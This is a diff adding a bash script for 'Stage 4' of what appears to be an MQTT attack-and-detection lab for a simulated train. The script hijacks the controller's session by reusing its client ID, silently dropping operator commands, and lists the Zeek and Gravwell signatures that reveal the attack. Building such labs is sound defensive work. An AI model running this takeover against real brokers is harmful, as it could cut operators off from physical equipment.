@@ -1,0 +1,60 @@
+#!/usr/bin/env bash
+# Stage 4 — MQTT Controller Takeover (V3 + V5)
+# Connects with the controller's exact client ID, which causes the broker to
+# disconnect the legitimate controller. This container becomes the sole consumer
+# of cmd/+ for 15 seconds, then releases.
+# Zeek visibility: mqtt.log — CONNECT with controller client ID from attacker IP
+set -euo pipefail
+
+BROKER="${BROKER:-mosquitto}"
+TRAIN="${TRAIN:-t1}"
+HOLD="${HOLD:-15}"  # seconds to hold the takeover
+
+CLIENT_ID="choochoo-controller-${TRAIN}"
+
+echo "=== [mqtt-takeover] Stage 4: Controller session hijack ==="
+echo ""
+echo "Target client ID: $CLIENT_ID"
+echo "When we connect with this ID, the broker kicks the legitimate controller."
+echo "The controller will immediately try to reconnect — we need to re-evict it."
+echo ""
+
+echo "--- Subscribing to state so we can see the controller go offline ---"
+mosquitto_sub -h "$BROKER" -t "choochoo/train/${TRAIN}/discovery" -C 1 -v 2>/dev/null &
+SUB_PID=$!
+sleep 1
+
+echo "--- Connecting as the controller (this kicks the real controller) ---"
+echo "  Zeek mqtt.log will show a CONNECT from our IP with client_id=$CLIENT_ID"
+echo "  The legitimate controller's IP will show a disconnect immediately after."
+echo ""
+echo "Holding takeover for ${HOLD}s. Commands to the train now go nowhere."
+echo "(The FakeTrain will coast at last power value — real train would too.)"
+echo ""
+
+# Connect with the controller's client ID; subscribe to cmd/+ but ignore it
+timeout "$HOLD" mosquitto_sub -h "$BROKER" \
+  -i "$CLIENT_ID" \
+  -t "choochoo/train/${TRAIN}/cmd/+" \
+  -v 2>/dev/null &
+TAKEOVER_PID=$!
+
+# Show any commands the operator tries to send during the takeover
+sleep 2
+echo "--- Operator commands arriving (being silently dropped) ---"
+timeout $(( HOLD - 3 )) mosquitto_sub -h "$BROKER" \
+  -i "attacker-spy" \
+  -t "choochoo/train/${TRAIN}/cmd/+" \
+  -v 2>/dev/null || true
+
+wait $TAKEOVER_PID 2>/dev/null || true
+wait $SUB_PID 2>/dev/null || true
+
+echo ""
+echo "Takeover released. Legitimate controller will reconnect within seconds."
+
+echo ""
+echo "[mqtt-takeover] Done. Check mqtt.log on the sensor — look for:"
+echo "  CONNECT with client_id=choochoo-controller-t1 from attacker IP (not controller IP)"
+echo "  DISCONNECT of the legitimate controller immediately after"
+echo "  Gravwell: tag=zeek json _path=='mqtt' client_id=='choochoo-controller-t1' | table id.orig_h ts"
